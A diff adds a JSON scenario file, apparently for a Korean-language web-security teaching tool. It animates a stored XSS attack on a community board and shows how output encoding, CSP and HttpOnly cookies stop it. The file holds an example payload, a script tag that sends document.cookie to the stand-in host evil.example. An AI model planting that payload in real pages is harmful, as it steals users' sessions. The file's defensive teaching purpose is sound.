@@ -1,0 +1,181 @@
+{
+  "id": "xss",
+  "name": "XSS",
+  "englishName": "Cross-Site Scripting",
+  "aliases": ["교차 사이트 스크립팅", "크로스 사이트 스크립팅", "저장형 XSS"],
+  "category": "web-security",
+  "summary": "공격자가 넣은 스크립트가 다른 사용자의 브라우저에서 그 사이트의 코드처럼 실행되는 공격",
+  "description": "사이트가 사용자가 쓴 내용을 그대로 페이지에 넣으면, 그 안에 숨긴 스크립트가 다른 사람의 브라우저에서 실행된다. 브라우저는 이 스크립트를 그 사이트의 코드로 보기 때문에 그 사이트의 쿠키와 화면에 접근할 수 있다. 게시판처럼 서버에 저장되었다가 여러 사람에게 보여지는 경우를 저장형 XSS라고 한다.",
+  "status": "draft",
+  "scenario": {
+    "playerType": "flow",
+    "actors": [
+      { "id": "browser", "name": "피해자 브라우저", "role": "user", "kind": "browser", "zone": "client", "site": "browser" },
+      {
+        "id": "boardTab",
+        "name": "커뮤니티 탭",
+        "role": "user",
+        "kind": "tab",
+        "parent": "browser",
+        "site": "board.example",
+        "screen": { "title": "자유게시판", "lines": ["로그인: 피해자", "새 글 1개"] },
+        "back": { "title": "숨은 스크립트", "lines": ["<script>", "fetch('//evil.example/c?'", "  + document.cookie)", "</script>"] }
+      },
+      { "id": "jar", "name": "쿠키 보관함", "role": "user", "kind": "cookieJar", "parent": "browser" },
+      { "id": "board", "name": "커뮤니티 서버", "role": "server", "kind": "server", "zone": "server", "site": "board.example" },
+      { "id": "evil", "name": "공격자 수집 서버", "role": "server", "kind": "server", "zone": "server", "site": "evil.example", "tone": "attack" },
+      { "id": "attacker", "name": "공격자", "role": "attacker", "kind": "attacker", "zone": "outside" }
+    ],
+    "steps": [
+      {
+        "action": "send",
+        "from": "boardTab",
+        "to": "board",
+        "title": "로그인",
+        "label": "POST /login",
+        "caption": "피해자가 커뮤니티 탭에서 board.example에 로그인합니다. 이 사이트에는 누구나 글을 쓸 수 있는 게시판이 있습니다."
+      },
+      {
+        "action": "send",
+        "from": "board",
+        "to": "boardTab",
+        "title": "세션 쿠키 발급",
+        "label": "Set-Cookie: session",
+        "caption": "서버가 로그인 상태를 기억하는 세션 쿠키를 보내고, 브라우저는 board.example용 보관함에 넣어 둡니다. 이 쿠키만 있으면 서버는 피해자로 인정합니다.",
+        "effects": [{ "type": "store", "item": "cookie", "into": "jar" }]
+      },
+      {
+        "action": "send",
+        "from": "attacker",
+        "to": "board",
+        "title": "스크립트를 담은 글 등록",
+        "label": "POST /posts · 본문에 <script>",
+        "caption": "공격자가 게시판에 글을 올립니다. 평범한 안내 문장 사이에 <script> 코드를 숨겨 넣었고, 서버는 본문을 그대로 저장합니다.",
+        "danger": true,
+        "effects": [{ "type": "store", "item": "script", "into": "board", "label": "게시글 42" }]
+      },
+      {
+        "action": "send",
+        "from": "boardTab",
+        "to": "board",
+        "title": "피해자가 글을 엶",
+        "label": "GET /posts/42",
+        "caption": "피해자가 게시판에서 그 글을 엽니다. board.example로 가는 요청이므로 브라우저는 세션 쿠키를 함께 보냅니다.",
+        "effects": [{ "type": "attach", "item": "cookie", "from": "jar", "label": "Cookie" }]
+      },
+      {
+        "action": "send",
+        "from": "board",
+        "to": "boardTab",
+        "title": "스크립트가 든 페이지 도착",
+        "label": "게시글 42 페이지",
+        "caption": "서버가 저장해 둔 본문을 그대로 페이지에 넣어 보냅니다. 화면에는 평범한 글만 보이지만, 페이지 안에는 공격자의 <script>가 코드로 들어 있습니다.",
+        "danger": true,
+        "effects": [
+          { "type": "attach", "item": "script", "from": "board", "label": "<script>", "note": "저장된 본문을 그대로 페이지에 넣음" },
+          { "type": "rewrite", "target": "boardTab", "screen": { "title": "이벤트 안내", "lines": ["추첨으로 상품을 드려요", "댓글 3개"] } },
+          { "type": "flip", "target": "boardTab" }
+        ]
+      },
+      {
+        "action": "send",
+        "from": "boardTab",
+        "to": "boardTab",
+        "title": "스크립트 실행",
+        "label": "<script> 실행",
+        "caption": "브라우저는 이 코드를 board.example 페이지의 일부로 보고 실행합니다. 그래서 스크립트는 이 사이트의 쿠키와 화면에 접근할 수 있습니다. 실제로는 페이지가 열리는 순간 바로 실행됩니다.",
+        "danger": true,
+        "effects": [{ "type": "run", "item": "script", "target": "boardTab" }]
+      },
+      {
+        "action": "send",
+        "from": "boardTab",
+        "to": "evil",
+        "title": "쿠키를 공격자 서버로",
+        "label": "GET evil.example/c?…",
+        "caption": "스크립트가 document.cookie로 세션 쿠키를 읽어 공격자 서버 주소에 붙여 보냅니다. 공격자는 이 쿠키로 피해자인 척 사이트를 쓸 수 있습니다.",
+        "danger": true,
+        "effects": [
+          { "type": "attach", "item": "cookie", "from": "jar", "label": "session=…", "note": "스크립트가 document.cookie로 읽음" },
+          { "type": "store", "item": "cookie", "into": "evil", "label": "훔친 세션 쿠키" }
+        ]
+      }
+    ]
+  },
+  "defenses": [
+    {
+      "name": "출력 인코딩",
+      "kind": "defense",
+      "description": "사용자가 쓴 값을 페이지에 넣을 때 <, >, \", ', & 같은 글자를 &lt; 같은 HTML 엔티티로 바꿔(인코딩) 넣습니다. 브라우저는 그 값을 코드가 아니라 글자로만 그립니다. 넣는 자리(HTML 본문, 속성, 자바스크립트, URL)에 맞는 인코딩을 써야 하며, OWASP가 모든 경우에 권하는 기본 방어입니다.",
+      "blockedAtStep": 5,
+      "blockedTitle": "글자로만 그려진 스크립트",
+      "blockedLabel": "인코딩 · 글자로 표시",
+      "blockedCaption": "서버가 본문을 페이지에 넣을 때 <를 &lt;로, >를 &gt;로 바꿔 넣습니다. 브라우저는 이것을 코드가 아니라 글자로 그리므로, 화면에 <script>…가 글자 그대로 보일 뿐 실행되지 않습니다.",
+      "overrides": [
+        {
+          "step": 5,
+          "effects": [
+            { "type": "attach", "item": "script", "from": "board", "label": "&lt;script&gt;", "note": "<, >를 글자(엔티티)로 바꿔 넣음" },
+            {
+              "type": "rewrite",
+              "target": "boardTab",
+              "screen": { "title": "이벤트 안내", "lines": ["추첨으로 상품을 드려요", "<script>fetch('//evil.example", "/c?'+document.cookie)</script>"] }
+            },
+            { "type": "store", "item": "script", "into": "boardTab", "label": "글자" },
+            { "type": "run", "item": "script", "target": "boardTab", "refused": true, "reason": "글자일 뿐 코드가 아님" }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "CSP",
+      "kind": "defense",
+      "description": "Content-Security-Policy 헤더로 이 페이지가 실행해도 되는 스크립트를 정합니다. script-src에 'unsafe-inline'을 넣지 않으면 페이지에 섞여 들어온 인라인 스크립트는 실행되지 않습니다. 인코딩이 빠진 곳을 막아 주는 추가 방어(심층 방어)이지, 인코딩을 대신하지는 않습니다.",
+      "blockedAtStep": 6,
+      "blockedTitle": "인라인 스크립트 실행 차단",
+      "blockedLabel": "CSP · 실행 차단",
+      "blockedCaption": "브라우저가 실행하기 전에 서버가 보낸 CSP를 확인합니다. 허용된 파일(script-src 'self')이나 nonce가 맞는 스크립트만 실행하므로, 본문에 끼어든 인라인 <script>는 실행되지 않습니다.",
+      "overrides": [
+        {
+          "step": 5,
+          "caption": "서버가 저장해 둔 본문을 그대로 넣은 페이지를 보내면서, Content-Security-Policy: script-src 'self' 헤더도 함께 보냅니다. 페이지 안에는 여전히 공격자의 <script>가 들어 있습니다."
+        },
+        {
+          "step": 6,
+          "effects": [{ "type": "run", "item": "script", "target": "boardTab", "refused": true, "reason": "CSP: 인라인 스크립트 금지" }]
+        }
+      ]
+    },
+    {
+      "name": "HttpOnly 쿠키",
+      "kind": "defense",
+      "description": "쿠키에 HttpOnly를 지정하면 자바스크립트가 document.cookie로 그 쿠키를 읽을 수 없습니다. 다만 XSS 자체를 막지는 못합니다. 스크립트는 여전히 실행되어 화면 내용을 읽어 보내거나, 사용자 대신 요청을 보낼 수 있습니다(그 요청에는 쿠키가 자동으로 붙습니다). 피해를 줄이는 보조 방어입니다.",
+      "blockedAtStep": 7,
+      "blockedTitle": "쿠키 탈취만 차단",
+      "blockedLabel": "HttpOnly · 쿠키 못 읽음",
+      "blockedCaption": "세션 쿠키가 HttpOnly라서 스크립트가 document.cookie로 읽지 못하고, 쿠키 탈취는 막힙니다. 하지만 스크립트는 이미 실행 중이라 화면에 보이는 정보는 그대로 보낼 수 있고, 사용자 대신 요청을 보낼 수도 있습니다. 피해를 줄일 뿐 XSS를 막지는 못합니다.",
+      "overrides": [
+        {
+          "step": 2,
+          "title": "HttpOnly 세션 쿠키 발급",
+          "caption": "서버가 HttpOnly를 지정한 세션 쿠키를 보냅니다. 브라우저는 이 쿠키를 요청에는 붙이지만, 페이지의 자바스크립트에는 보여 주지 않습니다.",
+          "effects": [{ "type": "store", "item": "cookie", "into": "jar", "label": "HttpOnly" }]
+        },
+        {
+          "step": 7,
+          "effects": [
+            { "type": "attach", "item": "cookie", "from": "jar", "label": "session=…", "refused": true, "reason": "HttpOnly: 스크립트가 못 읽음" },
+            { "type": "store", "item": "data", "into": "evil", "label": "화면 정보는 전송됨" }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    { "title": "OWASP Cross Site Scripting Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
+    { "title": "OWASP Cross Site Scripting (XSS)", "url": "https://community.owasp.org/attacks/xss/" },
+    { "title": "MDN · Content Security Policy (CSP)", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" },
+    { "title": "MDN · Set-Cookie의 HttpOnly 속성", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie" }
+  ],
+  "related": ["csrf", "session-hijacking"]
+}
